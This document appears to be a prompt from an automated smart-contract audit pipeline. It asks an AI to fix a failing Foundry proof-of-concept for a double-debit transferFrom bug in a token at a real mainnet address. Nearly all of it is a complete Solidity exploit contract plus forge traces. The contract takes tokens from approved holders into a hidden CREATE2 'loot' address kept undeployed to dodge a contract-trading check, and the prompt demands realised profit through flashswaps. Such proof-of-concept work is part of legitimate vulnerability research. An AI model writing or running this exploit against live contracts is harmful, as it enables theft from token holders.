You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: ERC721-style `transferFrom` debits two NFT-worths of ERC20 balance for one NFT transfer
- claim: When `value < _nextTokenId()`, `transferFrom` treats `value` as an NFT id, performs `_transfer(from, to, tokensPerNFT, false)`, then calls `_safeTransferFrom`, which performs a second `_transfer(from, to, tokensPerNFT, false)`. One NFT transfer therefore moves only one NFT id but debits and credits `2 * tokensPerNFT` fungible units.
- impact: Any owner, approved operator, or stale per-token approvee using the NFT branch of `transferFrom` can overcharge the sender by an extra whole-NFT worth of ERC20 balance. This breaks the ERC20/NFT backing invariant, gifts the recipient extra fungible value, and can strand the sender's remaining NFTs behind insufficient ERC20 balance. Holders with only one NFT-worth of balance cannot use this `transferFrom` path at all because the second debit reverts.
- exploit_paths: ["A holder owns NFT `id` and at least `2 * tokensPerNFT` fungible balance", "An authorized caller invokes `transferFrom(from, to, id)`", "The call transfers NFT `id` once but transfers `tokensPerNFT` fungible units twice"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IMinerTarget {
    function tokensPerNFT() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function tokensOfOwner(address owner) external view returns (uint256[] memory);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function isApprovedForAll(address account, address operator) external view returns (bool);
    function getApproved(uint256 id) external view returns (address);
}

contract LootWallet {
    constructor() {}
}

contract FlawVerifier {
    address public constant TARGET = 0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD;
    bytes32 private constant LOOT_SALT = keccak256("miner-f001-loot");

    address private immutable _loot;
    uint256 private _profitAmount;

    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    address public exploitedFrom;
    uint256 public exploitedTokenId;

    constructor() {
        _loot = _computeLootAddress();
    }

    function executeOnOpportunity() public {
        IMinerTarget target = IMinerTarget(TARGET);
        uint256 unit = target.tokensPerNFT();
        uint256 controlledBefore = _controlledBalance(target);

        _profitAmount = 0;
        hypothesisValidated = false;
        hypothesisRefuted = false;
        exploitedFrom = address(0);
        exploitedTokenId = 0;

        // Profit path, kept path-strict:
        // 1. A holder already owns an NFT id and at least 2 * tokensPerNFT fungible balance.
        // 2. This verifier is already an authorized operator or per-token approvee.
        // 3. The verifier calls transferFrom(holder, attackerLoot, id).
        // 4. The target debits and credits 2 * tokensPerNFT while moving only one NFT id.
        //
        // The loot address is intentionally kept undeployed so it looks like an EOA to the target,
        // which avoids the launch-era "contract trading restricted" check if that flag is still on.
        if (_attemptProfitablePull(target, msg.sender, unit)) {
            _profitAmount = _netControlledGain(target, controlledBefore);
            return;
        }

        if (tx.origin != msg.sender && _attemptProfitablePull(target, tx.origin, unit)) {
            _profitAmount = _netControlledGain(target, controlledBefore);
            return;
        }

        // If no third-party approval exists, the fresh verifier cannot steal from arbitrary holders:
        // transferFrom only authorizes msg.sender when msg.sender == from, isApprovedForAll(from, msg.sender),
        // or getApproved[id] == msg.sender. A newly deployed verifier does not satisfy those historical approvals
        // by default at the fork block. In that case, only a self-funded validation remains.
        //
        // This branch still follows the exact finding path on verifier-held inventory:
        // holder owns NFT id + >= 2 * tokensPerNFT, authorized caller invokes transferFrom(from, to, id),
        // and the call moves one NFT id while debiting and crediting 2 * tokensPerNFT.
        //
        // Net attacker profit is correctly reported as zero here because both payer and recipient remain
        // attacker-controlled addresses (the verifier and its undeployed CREATE2 loot address).
        _attemptSelfHeldValidation(target, unit);

        _profitAmount = _netControlledGain(target, controlledBefore);
    }

    function profitToken() external pure returns (address) {
        return TARGET;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function lootAddress() external view returns (address) {
        return _loot;
    }

    function deployLootWallet() external returns (address deployed) {
        if (_loot.code.length != 0) {
            return _loot;
        }
        deployed = address(new LootWallet{salt: LOOT_SALT}());
        require(deployed == _loot, "loot mismatch");
    }

    function _attemptProfitablePull(IMinerTarget target, address victim, uint256 unit) internal returns (bool) {
        if (victim == address(0) || victim == address(this) || victim == _loot) {
            return false;
        }

        if (target.balanceOf(victim) < unit * 2) {
            return false;
        }

        (bool hasToken, uint256 tokenId) = _firstOwnedToken(target, victim);
        if (!hasToken) {
            return false;
        }

        if (!_isAuthorized(target, victim, tokenId)) {
            return false;
        }

        uint256 victimBefore = target.balanceOf(victim);
        uint256 lootBefore = target.balanceOf(_loot);

        try target.transferFrom(victim, _loot, tokenId) returns (bool ok) {
            if (!ok) {
                return false;
            }
        } catch {
            return false;
        }

        uint256 victimAfter = target.balanceOf(victim);
        uint256 lootAfter = target.balanceOf(_loot);

        // The hypothesis is validated only if the path mechanics match the finding exactly:
        // one NFT-id transfer via transferFrom causes a double whole-NFT fungible move.
        if (victimBefore >= unit * 2 && victimAfter + unit * 2 == victimBefore && lootAfter == lootBefore + unit * 2) {
            hypothesisValidated = true;
            exploitedFrom = victim;
            exploitedTokenId = tokenId;
        } else {
            hypothesisRefuted = true;
        }

        return true;
    }

    function _attemptSelfHeldValidation(IMinerTarget target, uint256 unit) internal returns (bool) {
        if (target.balanceOf(address(this)) < unit * 2) {
            return false;
        }

        (bool hasToken, uint256 tokenId) = _firstOwnedToken(target, address(this));
        if (!hasToken) {
            return false;
        }

        uint256 selfBefore = target.balanceOf(address(this));
        uint256 lootBefore = target.balanceOf(_loot);

        try target.transferFrom(address(this), _loot, tokenId) returns (bool ok) {
            if (!ok) {
                return false;
            }
        } catch {
            return false;
        }

        uint256 selfAfter = target.balanceOf(address(this));
        uint256 lootAfter = target.balanceOf(_loot);

        if (selfBefore >= unit * 2 && selfAfter + unit * 2 == selfBefore && lootAfter == lootBefore + unit * 2) {
            hypothesisValidated = true;
            exploitedFrom = address(this);
            exploitedTokenId = tokenId;
        } else {
            hypothesisRefuted = true;
        }

        return true;
    }

    function _firstOwnedToken(IMinerTarget target, address owner) internal view returns (bool found, uint256 tokenId) {
        uint256[] memory owned = target.tokensOfOwner(owner);
        if (owned.length == 0) {
            return (false, 0);
        }
        return (true, owned[0]);
    }

    function _isAuthorized(IMinerTarget target, address owner, uint256 tokenId) internal view returns (bool) {
        return owner == address(this) || target.isApprovedForAll(owner, address(this)) || target.getApproved(tokenId) == address(this);
    }

    function _controlledBalance(IMinerTarget target) internal view returns (uint256) {
        return target.balanceOf(address(this)) + target.balanceOf(_loot);
    }

    function _netControlledGain(IMinerTarget target, uint256 controlledBefore) internal view returns (uint256) {
        uint256 controlledAfter = _controlledBalance(target);
        if (controlledAfter <= controlledBefore) {
            return 0;
        }
        return controlledAfter - controlledBefore;
    }

    function _computeLootAddress() internal view returns (address) {
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(this),
                LOOT_SALT,
                keccak256(type(LootWallet).creationCode)
            )
        );
        return address(uint160(uint256(hash)));
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.35s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 61819)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 18569

Traces:
  [61819] FlawVerifierTest::testExploit()
    ├─ [262] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD
    ├─ [2568] 0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [21330] FlawVerifier::executeOnOpportunity()
    │   ├─ [250] 0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD::tokensPerNFT() [staticcall]
    │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   ├─ [568] 0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2568] 0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD::balanceOf(0x8496C9f8356288a5887Cf59f97D741892ea1A077) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2568] 0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD::balanceOf(FlawVerifierTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2568] 0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD::balanceOf(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [568] 0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [568] 0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [568] 0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD::balanceOf(0x8496C9f8356288a5887Cf59f97D741892ea1A077) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [262] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD
    ├─ [379] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [568] 0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 19226507 [1.922e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 18569 [1.856e4])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 14.40s (1.42s CPU time)

Ran 1 test suite in 14.42s (14.40s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 61819)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
